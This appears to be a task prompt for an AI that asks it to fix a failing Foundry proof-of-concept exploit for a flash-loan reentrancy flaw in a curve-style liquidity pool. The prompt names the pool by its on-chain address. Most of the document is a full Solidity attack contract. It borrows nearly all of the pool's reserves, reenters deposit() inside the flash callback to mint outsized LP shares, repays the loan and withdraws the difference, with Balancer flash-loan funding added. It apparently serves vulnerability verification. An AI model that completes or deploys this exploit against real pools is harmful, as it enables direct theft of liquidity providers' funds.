You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Flash-loan callback can reenter deposits and mint LP against temporarily drained balances
- claim: `flash()` is not protected by `nonReentrant`, yet it transfers out pool assets and invokes a borrower-controlled callback before checking repayment. The callback can call `deposit()` (or `depositWithWhitelist()` when permitted) while balances are artificially low. LP minting uses `deposit * totalSupply / currentGrossLiquidity`, so temporarily draining reserves shrinks `currentGrossLiquidity` and mints outsized shares for a small real contribution.
- impact: A borrower can flash-borrow most liquidity, reenter a deposit while the pool appears nearly empty, repay the loan, and keep disproportionately large LP tokens that can later be redeemed for a large share of the restored pool. This is a direct pool-drain vector.
- exploit_paths: ["Call `flash()` from a contract borrower and receive most reserves", "Inside `flashCallback`, call `deposit()` while the borrowed assets are still out of the pool", "Repay the flash loan so the end-of-function balance checks pass", "Redeem the inflated LP position via `withdraw()`/`emergencyWithdraw()` to extract more assets than were honestly deposited"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetCurve {
    function derivatives(uint256 index) external view returns (address);
    function numeraires(uint256 index) external view returns (address);
    function reserves(uint256 index) external view returns (address);
    function frozen() external view returns (bool);
    function emergency() external view returns (bool);
    function whitelistingStage() external view returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function viewCurve() external view returns (uint256, uint256, uint256, uint256, uint256);
    function viewDeposit(uint256 depositAmount) external view returns (uint256 curvesMinted, uint256[] memory deposits);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function deposit(uint256 depositAmount, uint256 deadline) external returns (uint256 curvesMinted, uint256[] memory deposits);
    function withdraw(uint256 curvesToBurn, uint256 deadline) external returns (uint256[] memory withdrawals);
    function emergencyWithdraw(uint256 curvesToBurn, uint256 deadline) external returns (uint256[] memory withdrawals);
}

interface ITargetFlashCallback {
    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

library FullMathLocal {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        uint256 prod0;
        uint256 prod1;
        assembly {
            let mm := mulmod(a, b, not(0))
            prod0 := mul(a, b)
            prod1 := sub(sub(mm, prod0), lt(mm, prod0))
        }

        if (prod1 == 0) {
            require(denominator > 0, "div-by-zero");
            assembly {
                result := div(prod0, denominator)
            }
            return result;
        }

        require(denominator > prod1, "muldiv-overflow");

        uint256 remainder;
        assembly {
            remainder := mulmod(a, b, denominator)
            prod1 := sub(prod1, gt(remainder, prod0))
            prod0 := sub(prod0, remainder)
        }

        uint256 twos = denominator & (~denominator + 1);
        assembly {
            denominator := div(denominator, twos)
            prod0 := div(prod0, twos)
            twos := add(div(sub(0, twos), twos), 1)
        }

        prod0 |= prod1 * twos;

        uint256 inv = (3 * denominator) ^ 2;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;
        inv *= 2 - denominator * inv;

        result = prod0 * inv;
    }

    function mulDivRoundingUp(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        result = mulDiv(a, b, denominator);
        if (mulmod(a, b, denominator) > 0) {
            require(result < type(uint256).max, "muldiv-round-overflow");
            result += 1;
        }
    }
}

contract FlawVerifier is ITargetFlashCallback, IBalancerFlashLoanRecipient {
    using FullMathLocal for uint256;

    address internal constant TARGET = 0x46161158b1947D9149E066d6d31AF1283b2d377C;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    enum Phase {
        Idle,
        InBalancerFlash,
        InTargetFlash
    }

    Phase internal phase;

    address internal token0;
    address internal token1;
    uint256 internal startBalance0;
    uint256 internal startBalance1;

    uint256 internal borrowed0;
    uint256 internal borrowed1;
    uint256 internal targetFee0;
    uint256 internal targetFee1;

    uint256 internal balancerLoan0;
    uint256 internal balancerLoan1;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        ITargetCurve curve = ITargetCurve(TARGET);

        require(!curve.frozen(), "target-frozen");
        require(!curve.emergency(), "target-emergency-mode");

        // If whitelist mode is still active at the fork block, the strict exploit path becomes
        // mechanically infeasible because this verifier has no merkle proof and must not fake one.
        require(!curve.whitelistingStage(), "whitelist-stage-on-going-no-proof");

        token0 = curve.derivatives(0);
        token1 = curve.derivatives(1);

        startBalance0 = IERC20Like(token0).balanceOf(address(this));
        startBalance1 = IERC20Like(token1).balanceOf(address(this));

        uint256 poolBal0 = IERC20Like(token0).balanceOf(TARGET);
        uint256 poolBal1 = IERC20Like(token1).balanceOf(TARGET);

        require(poolBal0 > 1 && poolBal1 > 1, "insufficient-pool-depth");

        borrowed0 = poolBal0 - 1;
        borrowed1 = poolBal1 - 1;

        (, , , uint256 epsilon, ) = curve.viewCurve();
        targetFee0 = borrowed0.mulDivRoundingUp(epsilon, 1e18);
        targetFee1 = borrowed1.mulDivRoundingUp(epsilon, 1e18);

        _setApprovals(curve);

        uint256 deficit0 = startBalance0 >= targetFee0 ? 0 : targetFee0 - startBalance0;
        uint256 deficit1 = startBalance1 >= targetFee1 ? 0 : targetFee1 - startBalance1;

        if (deficit0 == 0 && deficit1 == 0) {
            balancerLoan0 = 0;
            balancerLoan1 = 0;
            phase = Phase.InTargetFlash;
            curve.flash(address(this), borrowed0, borrowed1, bytes("target-flash"));
            _finalizeProfit();
            phase = Phase.Idle;
            return;
        }

        balancerLoan0 = deficit0;
        balancerLoan1 = deficit1;
        phase = Phase.InBalancerFlash;

        uint256 count;
        if (deficit0 > 0) count++;
        if (deficit1 > 0) count++;

        address[] memory tokens = new address[](count);
        uint256[] memory amounts = new uint256[](count);

        uint256 idx;
        if (deficit0 > 0) {
            tokens[idx] = token0;
            amounts[idx] = deficit0;
            idx++;
        }
        if (deficit1 > 0) {
            tokens[idx] = token1;
            amounts[idx] = deficit1;
        }

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes("balancer-flash"));

        _finalizeProfit();
        phase = Phase.Idle;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not-balancer-vault");
        require(phase == Phase.InBalancerFlash, "unexpected-balancer-callback");

        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == token0) {
                require(amounts[i] == balancerLoan0, "unexpected-token0-loan");
            } else if (tokens[i] == token1) {
                require(amounts[i] == balancerLoan1, "unexpected-token1-loan");
            } else {
                revert("unexpected-balancer-token");
            }
        }

        phase = Phase.InTargetFlash;
        ITargetCurve(TARGET).flash(address(this), borrowed0, borrowed1, bytes("target-flash"));

        for (uint256 i = 0; i < tokens.length; i++) {
            require(IERC20Like(tokens[i]).transfer(BALANCER_VAULT, amounts[i] + feeAmounts[i]), "balancer-repay-failed");
        }
    }

    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata) external override {
        require(msg.sender == TARGET, "not-target");
        require(phase == Phase.InTargetFlash, "unexpected-target-callback");
        require(fee0 == targetFee0 && fee1 == targetFee1, "fee-mismatch");

        ITargetCurve curve = ITargetCurve(TARGET);

        uint256 maxSpend0 = _depositableCap(token0, targetFee0, balancerLoan0);
        uint256 maxSpend1 = _depositableCap(token1, targetFee1, balancerLoan1);

        uint256 depositAmount = _findMaxDeposit(curve, maxSpend0, maxSpend1);
        require(depositAmount > 0, "no-feasible-reentrant-deposit");

        (, uint256[] memory deposited) = curve.deposit(depositAmount, type(uint256).max);
        require(deposited.length >= 2, "unexpected-deposit-shape");
        require(deposited[0] <= maxSpend0 && deposited[1] <= maxSpend1, "deposit-exceeds-cap");

        require(IERC20Like(token0).transfer(TARGET, borrowed0 + targetFee0 - deposited[0]), "token0-target-repay-failed");
        require(IERC20Like(token1).transfer(TARGET, borrowed1 + targetFee1 - deposited[1]), "token1-target-repay-failed");

        uint256 lpBalance = curve.balanceOf(address(this));
        require(lpBalance > 0, "no-lp-minted");

        if (curve.emergency()) {
            curve.emergencyWithdraw(lpBalance, type(uint256).max);
        } else {
            curve.withdraw(lpBalance, type(uint256).max);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _setApprovals(ITargetCurve curve) internal {
        _approveIfNeeded(token0, TARGET);
        _approveIfNeeded(token1, TARGET);

        _approveIfNeeded(curve.numeraires(0), TARGET);
        _approveIfNeeded(curve.numeraires(1), TARGET);
        _approveIfNeeded(curve.reserves(0), TARGET);
        _approveIfNeeded(curve.reserves(1), TARGET);
    }

    function _approveIfNeeded(address token, address spender) internal {
        if (token != address(0)) {
            IERC20Like erc20 = IERC20Like(token);
            if (erc20.allowance(address(this), spender) < type(uint256).max / 2) {
                require(erc20.approve(spender, 0), "approve-reset-failed");
                require(erc20.approve(spender, type(uint256).max), "approve-max-failed");
            }
        }
    }

    function _depositableCap(address token, uint256 flashFee, uint256 externalLoanPrincipal) internal view returns (uint256) {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        uint256 reserved = flashFee + externalLoanPrincipal;
        if (balance <= reserved) {
            return 0;
        }
        return balance - reserved;
    }

    function _findMaxDeposit(ITargetCurve curve, uint256 cap0, uint256 cap1) internal view returns (uint256 best) {
        uint256 supply = curve.totalSupply();
        require(supply > 0, "zero-supply");

        uint256 low = 0;
        uint256 high = supply;

        for (uint256 i = 0; i < 16; i++) {
            if (_depositFits(curve, high, cap0, cap1)) {
                low = high;
                high = high * 2;
            } else {
                break;
            }
        }

        uint256 left = low;
        uint256 right = high;
        while (left <= right) {
            uint256 mid = left + ((right - left) >> 1);
            if (_depositFits(curve, mid, cap0, cap1)) {
                best = mid;
                left = mid + 1;
            } else {
                if (mid == 0) break;
                right = mid - 1;
            }
        }
    }

    function _depositFits(ITargetCurve curve, uint256 depositAmount, uint256 cap0, uint256 cap1) internal view returns (bool) {
        if (depositAmount == 0) {
            return true;
        }

        try curve.viewDeposit(depositAmount) returns (uint256, uint256[] memory deposits) {
            if (deposits.length < 2) {
                return false;
            }
            return deposits[0] <= cap0 && deposits[1] <= cap1;
        } catch {
            return false;
        }
    }

    function _finalizeProfit() internal {
        uint256 end0 = IERC20Like(token0).balanceOf(address(this));
        uint256 end1 = IERC20Like(token1).balanceOf(address(this));

        uint256 profit0 = end0 > startBalance0 ? end0 - startBalance0 : 0;
        uint256 profit1 = end1 > startBalance1 ? end1 - startBalance1 : 0;

        if (profit0 >= profit1 && profit0 > 0) {
            _profitToken = token0;
            _profitAmount = profit0;
        } else if (profit1 > 0) {
            _profitToken = token1;
            _profitAmount = profit1;
        } else {
            _profitToken = address(0);
            _profitAmount = 0;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: flash(), deposit(), withdraw(), emergencywithdraw()
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
